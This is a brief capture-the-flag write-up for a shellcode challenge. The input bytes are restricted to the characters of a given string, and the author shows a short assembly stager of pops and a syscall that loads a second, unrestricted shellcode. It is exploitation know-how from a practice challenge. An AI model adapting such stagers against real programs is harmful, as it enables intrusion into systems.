### Shellcode


This is an easy challenge 

It restrict us only use any char in that string

`ZZJ loves shell_code,and here is a gift:\017\005 enjoy it!\n`

```
pop rdx
pop rdx
pop rdx
pop rdx
pop rdi
pop rdi
syscall
```

Use it to write another True shellcode

